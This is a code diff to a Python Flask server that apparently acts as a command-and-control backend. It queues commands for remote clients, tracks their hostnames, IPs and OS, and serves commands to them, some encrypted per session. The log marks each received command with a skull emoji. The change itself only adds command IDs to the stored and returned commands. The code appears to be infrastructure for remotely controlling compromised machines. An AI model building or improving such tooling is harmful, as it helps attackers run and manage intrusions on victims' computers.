@@ -164,6 +164,7 @@ def save_client_to_db(client_id, last_seen, os_info=None, hostname=None, ip=None
         logger.error(f"Failed to save client to DB: {e}")
 
 def save_command_to_db(command, client_id, status="pending"):
+    """Save command to DB and return the inserted row ID."""
     try:
         conn = sqlite3.connect(DB_PATH)
         cursor = conn.cursor()
@@ -171,10 +172,13 @@ def save_command_to_db(command, client_id, status="pending"):
             INSERT INTO commands (command, client_id, status, created_at)
             VALUES (?, ?, ?, ?)
         ''', (command, client_id, status, time.time()))
+        row_id = cursor.lastrowid
         conn.commit()
         conn.close()
+        return row_id
     except Exception as e:
         logger.error(f"Failed to save command to DB: {e}")
+        return None
 
 def load_data_from_db():
     global clients, clients_data, commands
@@ -199,9 +203,9 @@ def load_data_from_db():
                 log_entry["chat_id"] = row[4]
             clients_data.append(log_entry)
 
-        cursor.execute('SELECT command, client_id FROM commands WHERE status = "pending"')
+        cursor.execute('SELECT id, command, client_id FROM commands WHERE status = "pending"')
         for row in cursor.fetchall():
-            commands.append(row[0])
+            commands.append({"id": row[0], "cmd": row[1]})
 
         conn.close()
         logger.info(f"📦 Loaded {len(clients)} clients, {len(clients_data)} logs, {len(commands)} commands from DB")
@@ -349,19 +353,26 @@ def receive_command():
     client_id = data.get("client_id", "all")
 
     logger.warning(f"💀 Command received: {cmd} for {client_id}")
-    commands.append(cmd)
-    save_command_to_db(cmd, client_id)
-    return "Command received"
+    row_id = save_command_to_db(cmd, client_id)
+    commands.append({"cmd": cmd, "id": row_id})
+    return jsonify({"status": "queued", "command_id": row_id})
 
 # ======================== 4. سحب الأوامر ========================
 @app.route("/get_command", methods=["GET"])
 @rate_limit
 def get_command():
     if commands:
-        cmd = commands.pop(0)
-        logger.info(f"📤 Command sent: {cmd}")
-        return jsonify({"command": cmd})
-    return jsonify({"command": None})
+        entry = commands.pop(0)
+        # Support both old plain strings and new dicts
+        if isinstance(entry, dict) and "cmd" in entry:
+            cmd_text = entry["cmd"]
+            cmd_id   = entry.get("id")
+        else:
+            cmd_text = entry
+            cmd_id   = None
+        logger.info(f"📤 Command sent: {cmd_text} (id={cmd_id})")
+        return jsonify({"command": cmd_text, "command_id": cmd_id})
+    return jsonify({"command": None, "command_id": None})
 
 # ======================== 5. إرسال أمر لجهاز معين ========================
 @app.route("/send_command", methods=["POST"])
@@ -375,15 +386,16 @@ def send_command():
     if client_id not in sessions:
         return "No session", 401
 
+    row_id = save_command_to_db(command, client_id)
+
     if sessions[client_id] is not None:
         encrypted_cmd = hybrid_encrypt(sessions[client_id], command)
-        commands.append({"client_id": client_id, "encrypted_cmd": encrypted_cmd})
+        commands.append({"client_id": client_id, "encrypted_cmd": encrypted_cmd, "id": row_id})
     else:
-        commands.append(command)
+        commands.append({"cmd": command, "id": row_id})
 
-    save_command_to_db(command, client_id)
-    logger.info(f"✅ Command stored for {client_id}")
-    return "Command stored"
+    logger.info(f"✅ Command stored for {client_id} (id={row_id})")
+    return jsonify({"status": "stored", "command_id": row_id})
 
 # ======================== 6. سحب أوامر مشفرة ========================
 @app.route("/get_command_encrypted", methods=["POST"])
@@ -393,14 +405,17 @@ def get_command_encrypted():
     client_id = data.get("client_id")
 
     if client_id not in sessions:
-        return jsonify({"command": None})
+        return jsonify({"command": None, "command_id": None})
 
-    for i, cmd in enumerate(commands):
-        if isinstance(cmd, dict) and cmd.get("client_id") == client_id:
+    for i, entry in enumerate(commands):
+        if isinstance(entry, dict) and entry.get("client_id") == client_id:
             commands.pop(i)
-            return jsonify({"command": cmd["encrypted_cmd"]})
+            return jsonify({
+                "command":    entry.get("encrypted_cmd"),
+                "command_id": entry.get("id"),
+            })
 
-    return jsonify({"command": None})
+    return jsonify({"command": None, "command_id": None})
 
 # ======================== 7. عرض السجلات ========================
 @app.route("/get", methods=["GET"])
